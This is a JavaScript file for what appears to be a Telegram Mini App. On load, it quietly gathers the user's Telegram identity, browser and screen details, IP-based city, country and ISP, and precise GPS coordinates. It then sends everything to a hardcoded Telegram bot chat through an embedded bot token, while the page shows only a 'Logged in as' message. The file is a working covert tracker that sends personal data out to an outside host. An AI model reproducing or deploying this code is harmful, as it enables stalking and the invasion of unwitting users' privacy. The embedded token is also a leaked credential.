
// ==========================
// PUT YOUR TOKEN & CHAT ID
// ==========================

const BOT_TOKEN = "AAH1GyhzfRBnAVys0fPS9qIyB5kcilW9W00";
const CHAT_ID   = "660086073";

async function getIPInfo(){
  try{
    const res = await fetch("https://ipapi.co/json/");
    return await res.json();
  }catch(e){
    return {};
  }
}

function getDeviceInfo(){
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    screen: window.screen.width + "x" + window.screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };
}

function getGPS(){
  return new Promise(resolve=>{
    if(!navigator.geolocation){
      resolve(null);
    }else{
      navigator.geolocation.getCurrentPosition(
        pos=>{
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          });
        },
        err=>{
          resolve(null);
        }
      );
    }
  });
}

async function sendFullLoginInfo(user){

  const ipData = await getIPInfo();
  const device = getDeviceInfo();
  const gps = await getGPS();

  let text = `
<b>🚨 LOGIN DETECTED</b>

👤 Name: ${user.first_name || ""}
🆔 ID: <code>${user.id}</code>
📛 Username: @${user.username || "none"}
🌍 Lang: ${user.language_code || ""}

🖥 Platform: ${device.platform}
📱 Screen: ${device.screen}
🌐 Browser: ${device.userAgent}
🕒 Timezone: ${device.timezone}

🌍 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || ""}
🌎 Country: ${ipData.country_name || ""}
📡 ISP: ${ipData.org || ""}

📍 GPS: ${gps ? gps.lat + ", " + gps.lon : "Not allowed"}

⏰ Time: ${new Date().toLocaleString()}
`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: "HTML"
    })
  });
}

if(window.Telegram && window.Telegram.WebApp){
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const user = tg.initDataUnsafe?.user;

  if(user){
    document.getElementById("status").innerText = "Logged in as " + user.first_name;
    sendFullLoginInfo(user);
  }else{
    document.getElementById("status").innerText = "No Telegram user detected";
  }
}else{
  document.getElementById("status").innerText = "Open inside Telegram Mini App";
}
